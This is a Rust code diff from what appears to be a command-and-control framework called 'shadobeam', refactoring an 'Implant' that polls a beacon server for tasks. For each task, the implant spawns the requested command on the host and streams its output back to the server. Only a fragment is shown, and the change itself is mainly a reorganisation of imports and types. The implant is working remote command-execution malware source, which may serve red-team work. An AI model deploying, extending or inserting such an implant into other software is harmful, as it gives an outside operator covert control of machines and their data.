@@ -2,32 +2,22 @@ use anyhow::{anyhow, Result};
 use rand::Rng;
 use uuid::Uuid;
 
+use shadobeam_proto::{
+    tasks::{
+        beacon_service_client::BeaconServiceClient, ConnectionRequest, OutputRequest, PollRequest,
+    },
+    Task,
+};
+
 use tokio::io::AsyncBufReadExt;
 use tokio::io::BufReader;
 use tokio::process::Command;
 use tonic::transport::Channel;
 
-use super::common::{Task, Uuid as Id};
-use super::tasks::{
-    beacon_service_client::BeaconServiceClient, ConnectionRequest, OutputRequest, PollRequest,
-};
-
 pub struct Implant {
     client: BeaconServiceClient<Channel>,
     uuid: Uuid,
     heartbeat: u32,
-}
-
-impl From<Id> for Uuid {
-    fn from(value: Id) -> Self {
-        Self::from_u64_pair(value.high, value.low)
-    }
-}
-impl From<Uuid> for Id {
-    fn from(value: Uuid) -> Self {
-        let (high, low) = value.as_u64_pair();
-        Self { high, low }
-    }
 }
 
 impl Implant {
@@ -55,20 +45,17 @@ impl Implant {
             .await?
             .into_inner();
 
-        Ok(response.task)
+        Ok(response.task.map(|t| t.into()))
     }
 
     pub async fn cmd(&mut self, task: Task) -> Result<()> {
         let stream = async_stream::stream! {
-            let shellcode = task
-                .shellcode
-                .ok_or(anyhow!("ShellCode cannot be empty.")).unwrap();
-            let mut output = Command::new(shellcode.command).stdout(std::process::Stdio::piped()).spawn().unwrap();
+            let mut output = Command::new(task.code.0).stdout(std::process::Stdio::piped()).spawn().unwrap();
             let mut lines = BufReader::new(output.stdout.take().unwrap()).lines();
 
             while let Some(line) = lines.next_line().await.unwrap() {
                 yield OutputRequest {
-                    task_uuid: task.uuid.clone(),
+                    task_uuid: Some(task.uuid.into()),
                     line,
                 }
             }
